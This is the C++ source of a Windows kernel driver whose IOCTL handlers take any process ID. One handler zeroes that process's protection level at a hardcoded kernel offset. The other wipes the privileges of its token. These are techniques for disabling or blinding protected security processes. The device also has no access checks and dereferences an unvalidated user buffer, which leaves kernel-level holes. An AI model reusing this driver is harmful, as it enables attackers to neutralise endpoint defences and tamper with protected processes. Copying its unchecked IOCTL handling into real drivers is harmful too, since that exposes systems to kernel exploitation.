#include "driver.h"
#include "ioctl.h"

PVOID myMemory;

extern "C" 
NTSTATUS 
DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath) {
	
	UNREFERENCED_PARAMETER(RegistryPath);

	PDEVICE_OBJECT deviceObject;
	NTSTATUS status;
	
	KdPrint(("Hello debugger, I am in Driver Entry\n"));

	DriverObject->DriverUnload = CleanUp;
	DriverObject->MajorFunction[IRP_MJ_CREATE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DeviceControl;

	myMemory = ExAllocatePool2(POOL_FLAG_PAGED, 1024, TAG);

	KdPrint(("Loaded memory at 0x%08p\n", myMemory));

	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, 0, FALSE, &deviceObject);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Error creating device. Status: 0x%08p\n", status));
		return status;
	}

	status = IoCreateSymbolicLink(&symlink, &deviceName);

	if (!NT_SUCCESS(status)) {
		KdPrint(("Error creating symlink. Status: 0x%08p\n", status));
		IoDeleteDevice(deviceObject);
		return status;
	}

	return STATUS_SUCCESS;
}

void CleanUp(PDRIVER_OBJECT DriverObject) {

	KdPrint(("Hello debugger, now I am in CleanUp\n"));
	KdPrint(("Freeing memory at 0x%08p\n", myMemory));

	ExFreePoolWithTag(myMemory, TAG);

	IoDeleteSymbolicLink(&symlink);
	IoDeleteDevice(DriverObject->DeviceObject);

}

NTSTATUS CreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);

	KdPrint(("Hello from CreateClose function\n"));

	Irp->IoStatus.Status = STATUS_SUCCESS;
	Irp->IoStatus.Information = 0;

	IoCompleteRequest(Irp, IO_NO_INCREMENT);

	return STATUS_SUCCESS;
}

NTSTATUS DeviceControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {

	UNREFERENCED_PARAMETER(DeviceObject);

	NTSTATUS status = STATUS_SUCCESS;
	ULONG_PTR length = 0;
	HANDLE pid;
	PEPROCESS eProcess;
	PPS_PROTECTION psProtection;

	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);

	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
	case PROCESS_PERMISSION:
		pid = *(HANDLE*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		KdPrint(("Someone used the driver with IOCTL 0x%08p and want to change %d process protection\n", stack->Parameters.DeviceIoControl.IoControlCode, pid));

		if (pid != 0) {
			PsLookupProcessByProcessId(pid, &eProcess);
			psProtection = (PPS_PROTECTION)(((ULONG_PTR)eProcess) + PS_PROTECTION_OFFSET);
			if (psProtection == nullptr)
			{
				KdPrint(("[+] PPS_PROTECTION was null\n"));
				status = STATUS_INVALID_PARAMETER;

				ObDereferenceObject(eProcess);

				break;
			}

			psProtection->Level = 0;
			psProtection->Type = 0;
			psProtection->Audit = 0;
			psProtection->Signer = 0;

			ObDereferenceObject(eProcess);

			break;
		}
		else {
			KdPrint(("The program does not exist or it is not recheable %d", pid));
			break;
		}
	case ELEVATE_TOKEN:

		pid = *(HANDLE*)stack->Parameters.DeviceIoControl.Type3InputBuffer;

		KdPrint(("Someone used the driver with IOCTL 0x%08p and want to change %d process protection\n", stack->Parameters.DeviceIoControl.IoControlCode, pid));

		if (pid != 0) {
			PsLookupProcessByProcessId(pid, &eProcess);

			PACCESS_TOKEN hToken = PsReferencePrimaryToken(eProcess);

			PSEP_TOKEN_PRIVILEGES tokenPrivs = (PSEP_TOKEN_PRIVILEGES)(((ULONG_PTR)hToken) + PRIVILEGE_TOKEN_OFFSET);

			if (tokenPrivs == nullptr)
			{
				KdPrint(("[+] PSEP_TOKEN_PRIVILEGES was null\n"));
				status = STATUS_INVALID_PARAMETER;

				ObDereferenceObject(eProcess);

				break;
			}

			tokenPrivs->Present[0] = tokenPrivs->Enabled[0] = 0x00;
			tokenPrivs->Present[1] = tokenPrivs->Enabled[1] = 0x00;
			tokenPrivs->Present[2] = tokenPrivs->Enabled[2] = 0x00;
			tokenPrivs->Present[3] = tokenPrivs->Enabled[3] = 0x00;

			ObDereferenceObject(eProcess);

			PsDereferencePrimaryToken(hToken);

			break;
		}
		else {
			KdPrint(("The program does not exist or it is not recheable %d", pid));
			break;
		}

	default:
		status = STATUS_INVALID_DEVICE_REQUEST;
		KdPrint(("Unknown IOCTL code\n"));
		break;
	}

		Irp->IoStatus.Status = status;
		Irp->IoStatus.Information = length;

		IoCompleteRequest(Irp, IO_NO_INCREMENT);

		return status;
}